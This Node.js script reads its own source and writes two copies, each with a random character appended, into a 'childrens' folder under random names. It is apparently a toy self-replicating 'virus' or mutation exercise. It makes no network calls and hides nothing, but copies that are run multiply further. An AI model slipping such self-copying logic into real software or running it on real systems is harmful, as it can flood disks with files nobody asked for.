const fs = require("fs");
const path = require("path");
const realPath = path.join(__dirname, "../childrens");
const myFileName = `${__filename}`;
const chars = [
  "a",
  "b",
  "c",
  "d",
  "e",
  "f",
  "g",
  "h",
  "i",
  "j",
  "k",
  "l",
  "m",
  "n",
  "o",
  "p",
  "r",
  "s",
  "t",
  "u",
  "v",
  "y",
  "z",
  "x",
  "q",
  "w",
];

const app = () => {
  const randomNumber = Math.floor(Math.random() * 1000000);
  const randomChar = Math.floor(Math.random() * 255);
  const getChar = String.fromCharCode(randomChar);
  const myTarget = `${realPath}\\${randomNumber}.js`;
  // console.log({ myFileName, myTarget });
  const data = fs.readFileSync(myFileName).toString() + getChar;
  fs.writeFileSync(myTarget, data);
};

for (let i = 0; i < 2; i++) {
  app();
}
